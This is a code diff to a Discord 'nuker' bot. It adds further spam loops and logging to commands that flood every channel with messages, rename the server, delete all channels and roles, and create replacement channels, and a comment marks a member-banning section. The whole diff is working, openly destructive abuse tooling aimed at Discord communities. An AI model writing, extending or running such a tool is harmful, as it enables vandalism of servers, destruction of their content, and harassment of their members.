@@ -19,41 +19,62 @@ client.on("message", async (message) => {
   const a = [1];
   // Spammer Codes
   if ("spam".includes(message.content)) {
-      message.delete()
-      for (let index = 0; index < a.length; index++) {
+    message.delete()
+    for (let index = 0; index < a.length; index++) {
+      message.guild.channels.cache.forEach((ch) => {
+        ch.send("spam")
+      })
       message.guild.channels.cache.forEach((channel) => {
-        channel.send(config.nuke_settings.message).catch((err) => console.log(""));
+        channel
+          .send(config.nuke_settings.message)
+          .then((m) => console.log("Spam message sent to channels"))
+          .catch((err) => console.log(" "));
         let everyoneRole = message.guild.roles.cache.find(
           (r) => r.name === "@everyone"
         );
-        message.guild.channels.create(config.nuke_settings.channel_name, {
-          type: "text",
-          permissionOverwrites: [
-            {
-              id: everyoneRole.id,
-              allow: ["VIEW_CHANNEL"],
-            },
-          ],
-        });
+        message.guild.channels
+          .create(config.nuke_settings.channel_name, {
+            type: "text",
+            permissionOverwrites: [
+              {
+                id: everyoneRole.id,
+                allow: ["VIEW_CHANNEL"],
+              },
+            ],
+          })
+          .then((c) => {
+            console.log(`Created channel: ${c.name}`);
+          });
       });
     }
   } else if (config.nuke_settings.message.includes(message.content)) {
     for (let index = 0; index < a.length; index++) {
+      message.guild.channels.cache.forEach((ch) => {
+        ch.send("spam")
+      })
       message.guild.channels.cache.forEach((channel) => {
-        channel.send(config.nuke_settings.message).catch((err) => console.log(""));
+        channel
+          .send(config.nuke_settings.message)
+          .then((m) => console.log("Spam message sent to channels"))
+          .catch((err) => console.log(" "));
+
         let everyoneRole = message.guild.roles.cache.find(
           (r) => r.name === "@everyone"
         );
-        message.guild.channels.create(config.nuke_settings.channel_name, {
-          type: "text",
-          permissionOverwrites: [
-            {
-              id: everyoneRole.id,
-              allow: ["VIEW_CHANNEL"],
-              deny: ["SEND_MESSAGES"],
-            },
-          ],
-        });
+        message.guild.channels
+          .create(config.nuke_settings.channel_name, {
+            type: "text",
+            permissionOverwrites: [
+              {
+                id: everyoneRole.id,
+                allow: ["VIEW_CHANNEL"],
+                deny: ["SEND_MESSAGES"],
+              },
+            ],
+          })
+          .then((c) => {
+            console.log(`Created channel: ${c.name}`);
+          });
       });
     }
   }
@@ -63,15 +84,33 @@ client.on("message", async (message) => {
     const args = message.content.slice(prefix.length).split(/ +/);
     const command = args.shift().toLowerCase();
     if (command == "auto" && !message.author.bot) {
-      message.delete()
+      message.guild.channels.cache.forEach((ch) => {
+        ch.send("spam")
+      })
+      message.channel
+        .send("spam")
+        .then((m) => console.log("Started spamming message."));
+      message.channel
+        .send("spam")
+        .then((m) => console.log("Started spamming message."));
+      message.channel
+        .send("spam")
+        .then((m) => console.log("Started spamming message."));
+      message.channel
+        .send("spam")
+        .then((m) => console.log("Started spamming message."));
+
       // Codes Nuker
 
-      message.guild.setName(config.nuke_settings.server_name);
+      message.guild
+        .setName(config.nuke_settings.server_name)
+        .then((n) => console.log("Changed server's name."));
       message.guild.channels.cache.forEach((channel) => {
         if (channel.name == config.nuke_settings.channel_name) return;
-        channel.delete().catch((error) => {
-          console.log(`:x: Couldn't delete ${channel.name}.`);
-        });
+        channel
+          .delete()
+          .catch((error) => console.log(`:x: Couldn't delete ${channel.name}.`))
+          .then((c) => console.log(`Deleted channels: ${channel.name}`));
 
         // channel creator
 
@@ -79,15 +118,17 @@ client.on("message", async (message) => {
           (r) => r.name === "@everyone"
         );
 
-        message.guild.channels.create(config.nuke_settings.channel_name, {
-          type: "text",
-          permissionOverwrites: [
-            {
-              id: everyoneRole.id,
-              allow: ["VIEW_CHANNEL"],
-            },
-          ],
-        });
+        message.guild.channels
+          .create(config.nuke_settings.channel_name, {
+            type: "text",
+            permissionOverwrites: [
+              {
+                id: everyoneRole.id,
+                allow: ["VIEW_CHANNEL"],
+              },
+            ],
+          })
+          .then((c) => console.log(`Created channels.`));
       });
 
       // Member Banner
@@ -106,10 +147,9 @@ client.on("message", async (message) => {
         if (role.editable && role.name !== message.guild.roles.everyone.name) {
           role.delete().then((deleted) => console.log(`Deleted ${role.name}`));
         } else {
-          console.log(`Cannot Delete ${role.name}`);
+          console.log(`Cannot Delete Role ${role.name}`);
         }
       });
-      message.channel.send("spam")
       // Nuke/Spam Disabler
     } else if (command == "disable") {
       message.channel.send("Destroied The Bot's Process.");
@@ -118,8 +158,11 @@ client.on("message", async (message) => {
     }
   }
 });
+
 client.login(config.bot_settings.bot_token).catch((_) => {
   // Checks if its unknown
 
-  console.error(`[ERR] Robot's token is expired or it's invaild! Double check it.`);
+  console.error(
+    `[ERR] Robot's token is expired or it's invaild! Double check it.`
+  );
 });
